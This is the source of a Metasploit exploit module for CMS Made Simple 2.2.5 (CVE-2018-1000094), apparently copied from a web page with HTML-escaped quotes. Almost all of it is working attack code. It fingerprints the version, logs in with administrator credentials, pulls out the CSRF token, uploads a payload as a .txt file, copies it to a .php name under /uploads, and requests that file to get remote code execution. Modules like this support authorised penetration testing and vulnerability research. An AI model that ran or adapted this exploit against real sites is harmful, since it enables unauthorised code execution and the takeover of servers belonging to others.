# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;CMS Made Simple Authenticated RCE via File Upload/Copy&#039;,
      &#039;Description&#039;     => %q{
        CMS Made Simple v2.2.5 allows an authenticated administrator to upload a file
        and rename it to have a .php extension. The file can then be executed by opening
        the URL of the file in the /uploads/ directory.
      },
      &#039;Author&#039; =>
        [
          &#039;Mustafa Hasen&#039;,  # Vulnerability discovery and EDB PoC
          &#039;Jacob Robles&#039;    # Metasploit Module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2018-1000094&#039; ],
          [ &#039;CWE&#039;, &#039;434&#039; ],
          [ &#039;EDB&#039;, &#039;44976&#039; ],
          [ &#039;URL&#039;, &#039;http://dev.cmsmadesimple.org/bug/view/11741&#039; ]
        ],
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;  => [ &#039;php&#039; ],
      &#039;Arch&#039;  => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;Universal&#039;, {} ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 03 2018&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base cmsms directory path", &#039;/cmsms/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;&#039;])
      ])

    register_advanced_options ([
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false])
    ])
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path),
      &#039;method&#039; => &#039;GET&#039;
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.body =~ /CMS Made Simple<\/a> version (\d+\.\d+\.\d+)/
      return CheckCode::Unknown
    end

    version = Gem::Version.new($1)
    vprint_status("#{peer} - CMS Made Simple Version: #{version}")

    if version == Gem::Version.new(&#039;2.2.5&#039;)
      return CheckCode::Appears
    end

    if version < Gem::Version.new(&#039;2.2.5&#039;)
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include?(check)
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;login.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;],
        &#039;loginsubmit&#039; => &#039;Submit&#039;
      }
    })
    unless res
      fail_with(Failure::NotFound, &#039;A response was not received from the remote host&#039;)
    end

    unless res.code == 302 && res.get_cookies && res.headers[&#039;Location&#039;] =~ /\/admin\?(.*)?=(.*)/
      fail_with(Failure::NoAccess, &#039;Authentication was unsuccessful&#039;)
    end

    vprint_good("#{peer} - Authentication successful")
    csrf_name = $1
    csrf_val = $2

    csrf = {csrf_name => csrf_val}
    cookies = res.get_cookies
    filename = rand_text_alpha(8..12)

    # Generate form data
    message = Rex::MIME::Message.new
    message.add_part(csrf[csrf_name], nil, nil, "form-data; name=\"#{csrf_name}\"")
    message.add_part(&#039;FileManager,m1_,upload,0&#039;, nil, nil, &#039;form-data; name="mact"&#039;)
    message.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="disable_buffer"&#039;)
    message.add_part(payload.encoded, nil, nil, "form-data; name=\"m1_files[]\"; filename=\"#{filename}.txt\"")
    data = message.to_s

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;moduleinterface.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{message.bound}",
      &#039;cookie&#039; => cookies
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, &#039;Failed to upload the text file&#039;)
    end
    vprint_good("#{peer} - File uploaded #{filename}.txt")

    fileb64 = Rex::Text.encode_base64("#{filename}.txt")
    data = {
      &#039;mact&#039; => &#039;FileManager,m1_,fileaction,0&#039;,
      "m1_fileactioncopy" => "",
      &#039;m1_selall&#039; => "a:1:{i:0;s:#{fileb64.length}:\"#{fileb64}\";}",
      &#039;m1_destdir&#039; => &#039;/&#039;,
      &#039;m1_destname&#039; => "#{filename}.php",
      &#039;m1_path&#039; => &#039;/uploads&#039;,
      &#039;m1_submit&#039; => &#039;Copy&#039;,
      csrf_name => csrf_val
    }

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;moduleinterface.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;vars_post&#039; => data
    })

    unless res
      fail_with(Failure::NotFound, &#039;A response was not received from the remote host&#039;)
    end

    unless res.code == 302 && res.headers[&#039;Location&#039;].to_s.include?(&#039;copysuccess&#039;)
      fail_with(Failure::UnexpectedReply, &#039;Failed to rename the file&#039;)
    end
    vprint_good("#{peer} - File renamed #{filename}.php")

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;uploads&#039;, "#{filename}.php"),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookies
    })
  end
end

